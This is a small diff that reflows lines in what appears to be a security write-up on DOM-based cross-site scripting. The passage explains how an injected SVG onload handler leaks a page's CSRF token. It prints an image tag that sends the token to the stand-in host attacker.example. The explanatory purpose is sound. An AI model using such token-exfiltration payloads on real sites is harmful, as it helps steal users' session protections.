@@ -43,8 +43,9 @@ https://example.com/updateItems.html#
 
 In this case, the JavaScript code on the page adds the SVG tag to the "err" element via the "innerHTML" property. Once the SVG tag is added, 
 its "onload" method is called. That method executes the event handler which writes an image tag to the page with the source attribute set to 
-an attacker website. The source URL is dynamically created by concatenating the attacker's website URL and sensitive data from the victim's page, 
-such as the value of the CSRF token stored in the element with the "csrf" id. The element added to the page will look like the following:
+an attacker website. The source URL is dynamically created by concatenating the attacker's website URL and sensitive
+data from the victim's page, such as the value of the CSRF token stored in the element with the "csrf" id. The element added to the page 
+will look like the following:
 
 <img src="http://attacker.example/listentodata?token=wS2sCg7DA0">
 
